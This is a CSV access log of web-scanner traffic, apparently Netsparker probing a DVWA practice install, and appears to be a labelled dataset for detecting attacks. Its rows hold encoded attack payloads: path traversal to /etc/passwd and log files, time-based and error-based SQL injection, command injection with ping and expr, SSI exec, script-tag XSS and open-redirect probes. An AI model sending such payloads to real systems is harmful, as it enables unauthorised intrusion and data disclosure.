host,tool,indent,user,time,method,request_path,status,size,referer,agent
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror.log HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror_log HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2%00.php HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion%00.php HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache%2ferror.log HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2ferror.log HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2fetc%2fpasswd HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=((select%20sleep(25)))a--%201 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202)a%20WHERE%201%3dsleep(25)))--%201 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=1%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=1)%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=1)%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=1))%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=1))%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=file%3a%2f%2f%2fetc%2fpasswd HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=low HTTP/1.1,200,1250,ns:netsparker056650=vuln,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=low%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=syscolumns%20WHERE%202%3e3%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=view_help.php HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%22%26expr%20268409241%20-%202%20%26%22&security=low HTTP/1.1,200,983,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%22%26ping%20-c%2025%20127.0.0.1%20%26%22&security=low HTTP/1.1,200,984,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%26expr%20268409241%20-%202%20%26&security=low HTTP/1.1,200,983,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%27%20OR%20%271%27%3d%271&security=low HTTP/1.1,200,971,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%27%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1,200,986,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%27%26expr%20268409241%20-%202%20%26%27&security=low HTTP/1.1,200,984,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2&security=low HTTP/1.1,200,980,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%3c!--%23exec%20cmd%3d%22expr%20268409241%20-%202%22--%3e&security=low HTTP/1.1,200,993,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=-1%20or%201%3d1%20and%20(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)&security=low HTTP/1.1,200,1101,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=-1%27%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27&security=low HTTP/1.1,200,1108,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%27 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%27%20OR%20%27ns%27%3d%27ns HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=1%20AND%20%27NS%3d%27ss HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=-1%20OR%201%3d1 HTTP/1.1,200,936,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=-1%20OR%201%3d1 HTTP/1.1,200,971,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=-1%20OR%2017-7%3d10 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=1%20OR%20X%3d%27ss HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=NS1NO HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=expr%20268409241%20-%202%20%26&security=low HTTP/1.1,200,982,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:18 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=expr%20268409241%20-%202&security=low HTTP/1.1,200,980,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0005A3)%3C/scRipt%3E&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f%2fr87.com%2f%3f0x0005A4&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f%2fr87.com%2f%3f0x0005A5&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0005A6)%3C/scRipt%3E HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0005A7)%3C/scRipt%3E HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2527%2522--%253E%253C%252Fstyle%253E%253C%252FscRipt%253E%253CscRipt%253Enetsparker%25280x0005A8%2529%253C%252FscRipt%253E HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2527%2522--%253E%253C%252Fstyle%253E%253C%252FscRipt%253E%253CscRipt%253Enetsparker%25280x0005A9%2529%253C%252FscRipt%253E HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2b((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2fDVWA%2fvulnerabilities%2fview_help.php HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2fvulnerabilities%2fview_help.php HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)) HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)) HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%22%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%22 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=view_help.php%00 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000595)%3C/scRipt%3E&security=low HTTP/1.1,200,997,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%26ping%20-c%2025%20127.0.0.1%20%26&security=low HTTP/1.1,200,982,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
